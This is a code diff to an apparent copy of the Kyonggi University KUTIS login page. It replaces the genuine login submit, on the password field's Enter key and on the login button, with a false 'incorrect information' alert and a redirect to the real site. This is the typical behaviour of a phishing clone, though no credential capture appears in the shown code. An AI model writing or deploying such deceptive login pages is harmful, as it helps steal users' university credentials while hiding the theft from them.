@@ -96,6 +96,16 @@ var SystemInfo = new function() {
 	 // ie 8미만 버전시 ie업데이트 안내페이지로 이동
 	 checkVersion();
 </script>
+<script>
+  function handleKeyDown(event) {
+    if (event.key === "Enter") {
+        event.preventDefault(); // 기본 동작 방지 (페이지 이동 방지)
+        alert("입력한 정보가 올바르지 않습니다!");
+        window.location.href = "https://kutis.kyonggi.ac.kr/webkutis/view/indexWeb.jsp"; // 이동할 링크 주소
+    }
+}
+
+</script>
 </HEAD>
 
 <body id="login">
@@ -120,11 +130,11 @@ var SystemInfo = new function() {
       <dl>
 
         <dd><input type=text name="id" id="id" value="" class=u_input_type size=11 maxlength=11 onKeyDown="CommKutisUtil.KeyDown(event)" onFocus="this.select();" onChange="document.myform.pw.focus();" class="userId" title="학번/교번"></dd>
-        <dd><input type=password name="pw" id="pw" value="" class=u_input_type size=14 onKeyDown="CommKutisUtil.KeyDown(event)" onFocus="this.select();" accesskey="" class="userPw" title="패스워드"></dd>
+        <dd><input type=password name="pw" id="pw" value="" class=u_input_type size=14 onKeyDown="handleKeyDown(event)" onFocus="this.select();" accesskey="" class="userPw" title="패스워드"></dd>
 
       </dl>
       <p class="btnArea">
-        <a href="javascript:;" onclick="CommKutisUtil.doSubmit('Y');" ><img src="https://kutis.kyonggi.ac.kr/webkutis/images/renewal/web/btn/btn_loginClass_off.gif" alt="학번/교번 로그인" /></a>
+        <a href="https://kutis.kyonggi.ac.kr/webkutis/view/indexWeb.jsp" onclick="alert('입력한 정보가 올바르지 않습니다!');" ><img src="https://kutis.kyonggi.ac.kr/webkutis/images/renewal/web/btn/btn_loginClass_off.gif" alt="학번/교번 로그인" /></a>
        </p>
     </fieldset>
     <!-- //로그인 폼 -->
